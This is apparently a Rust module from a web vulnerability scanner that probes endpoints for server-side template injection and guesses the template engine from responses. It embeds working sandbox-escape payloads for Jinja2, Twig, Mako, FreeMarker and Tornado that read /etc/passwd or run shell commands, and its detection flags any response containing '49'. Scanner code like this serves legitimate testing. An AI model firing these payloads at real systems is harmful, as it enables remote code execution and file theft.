//! # Phase 7: Server-Side Template Injection (SSTI)
//!
//! Detects and exploits SSTI vulnerabilities with automatic template engine identification.
//! Generates engine-specific sandbox escapes for RCE chains.
//!
//! ## Diagnostic Payloads
//! - `{{7*7}}` → 49 (Jinja2, Twig, Mako, Tornado)
//! - `{{7*'7'}}` → 7777777 (Jinja2-specific string multiplication)
//! - Differentiates between template engines via response analysis
//!
//! ## Exploitation
//! - Jinja2: `__class__.__mro__[2].__subclasses__()[40]('/etc/passwd')`
//! - Twig: `registerUndefinedFilterCallback('system')`
//! - Mako: `sys.modules['os'].system('id')`
//! - FreeMarker: `freemarker.template.utility.Execute`

use crate::{context::ScanContext, error::ScannerError, ScanFinding, ScanPhase};
use async_trait::async_trait;
use reqwest::StatusCode;
use url::Url;

/// SSTI detection with template engine identification and exploitation
#[derive(Debug)]
pub struct SstiScanner;

#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)]
enum TemplateEngine {
    Jinja2,
    Twig,
    Mako,
    FreeMarker,
    Tornado,
    Unknown,
}

impl SstiScanner {
    /// Diagnostic payloads to identify template engine via mathematical expressions
    fn diagnostic_payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            ("{{7*7}}", "jinja2_twig_mako"),       // All return 49
            ("{{7*'7'}}", "jinja2_specific"),      // Jinja2: 7777777, others: error
            ("${7*7}", "mako"),                    // Mako returns 49
            ("<#assign x=7*7>${x}", "freemarker"), // FreeMarker returns 49
            ("{{7*7}}", "tornado"),                // Tornado returns 49
        ]
    }

    /// Detect template engine based on response analysis
    fn detect_engine(response: &str) -> TemplateEngine {
        // Check for Jinja2-specific string multiplication
        if response.contains("7777777") {
            return TemplateEngine::Jinja2;
        }

        // Check for numeric result (49)
        if response.contains("49") {
            // Further differentiation needed, but likely Jinja2/Twig/Mako
            return TemplateEngine::Jinja2;
        }

        // Check for error patterns
        if response.contains("TemplateError") || response.contains("Undefined variable") {
            return TemplateEngine::Twig;
        }

        TemplateEngine::Unknown
    }

    /// Generate engine-specific sandbox escape payload
    fn generate_exploit_payload(engine: TemplateEngine) -> String {
        match engine {
            TemplateEngine::Jinja2 => {
                "{{self.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
                    .to_string()
            }
            TemplateEngine::Twig => {
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
                    .to_string()
            }
            TemplateEngine::Mako => {
                "${self.template.module.runtime.sys.modules['os'].system('id')}"
                    .to_string()
            }
            TemplateEngine::FreeMarker => {
                "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value('id')}"
                    .to_string()
            }
            TemplateEngine::Tornado => {
                "{{__import__('os').popen('id').read()}}"
                    .to_string()
            }
            TemplateEngine::Unknown => {
                "{{7*7}}".to_string()
            }
        }
    }
}

#[async_trait]
impl ScanPhase for SstiScanner {
    fn phase_number(&self) -> u8 {
        7
    }

    fn name(&self) -> &'static str {
        "SSTI Classifier & Sandbox Escaper"
    }

    async fn execute(&self, ctx: &ScanContext) -> Result<Vec<ScanFinding>, ScannerError> {
        ctx.log("Phase 7: SSTI scanning initiated...".to_string());
        let mut findings = Vec::new();

        for entry in ctx.discovered_endpoints.iter() {
            let endpoint = entry.key().clone();
            let params = entry.value().clone();

            for param in params.iter() {
                if let Ok(mut test_url) = Url::parse(&endpoint) {
                    // Test diagnostic payloads
                    for (payload, _payload_type) in Self::diagnostic_payloads() {
                        test_url.query_pairs_mut().clear();
                        test_url.query_pairs_mut().append_pair(param, payload);

                        match tokio::time::timeout(
                            std::time::Duration::from_secs(5),
                            ctx.client.get(test_url.as_str()).send(),
                        )
                        .await
                        {
                            Ok(Ok(response)) => {
                                if response.status() == StatusCode::OK {
                                    if let Ok(body) = response.text().await {
                                        // Detect template engine
                                        let engine = Self::detect_engine(&body);

                                        if engine != TemplateEngine::Unknown {
                                            let exploit_payload =
                                                Self::generate_exploit_payload(engine.clone());

                                            findings.push(ScanFinding {
                                                phase: self.phase_number(),
                                                module_name: self.name().to_string(),
                                                severity: "CRITICAL".to_string(),
                                                description: format!(
                                                    "Server-Side Template Injection detected ({:?}) on {}?{}. Exploit: {}",
                                                    engine, endpoint, param, exploit_payload
                                                ),
                                                evidence: format!(
                                                    "Diagnostic payload: {} | Response indicates {:?} template engine",
                                                    payload, engine
                                                ),
                                            });

                                            ctx.log(format!(
                                                "SSTI found: {:?} on {}?{}",
                                                engine, endpoint, param
                                            ));
                                            return Ok(findings);
                                        }
                                    }
                                }
                            },
                            _ => {},
                        }
                    }
                }
            }
        }

        ctx.log(format!(
            "Phase 7: SSTI scanning completed. Found {} vulnerabilities.",
            findings.len()
        ));
        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_phase_number() {
        let scanner = SstiScanner;
        assert_eq!(scanner.phase_number(), 7);
    }

    #[test]
    fn test_phase_name() {
        let scanner = SstiScanner;
        assert_eq!(scanner.name(), "SSTI Classifier & Sandbox Escaper");
    }

    #[test]
    fn test_diagnostic_payloads() {
        let payloads = SstiScanner::diagnostic_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(p, _)| p.contains("{{7*7}}")));
        assert!(payloads.iter().any(|(p, _)| p.contains("${7*7}")));
    }

    #[test]
    fn test_engine_detection_jinja2() {
        let response = "Result: 7777777";
        let engine = SstiScanner::detect_engine(response);
        assert_eq!(engine, TemplateEngine::Jinja2);
    }

    #[test]
    fn test_engine_detection_unknown() {
        let response = "No template markers here";
        let engine = SstiScanner::detect_engine(response);
        assert_eq!(engine, TemplateEngine::Unknown);
    }

    #[test]
    fn test_exploit_payload_generation() {
        let jinja2_payload = SstiScanner::generate_exploit_payload(TemplateEngine::Jinja2);
        assert!(jinja2_payload.contains("__class__"));
        assert!(jinja2_payload.contains("__mro__"));

        let mako_payload = SstiScanner::generate_exploit_payload(TemplateEngine::Mako);
        assert!(mako_payload.contains("sys.modules"));

        let twig_payload = SstiScanner::generate_exploit_payload(TemplateEngine::Twig);
        assert!(twig_payload.contains("registerUndefinedFilterCallback"));
    }
}
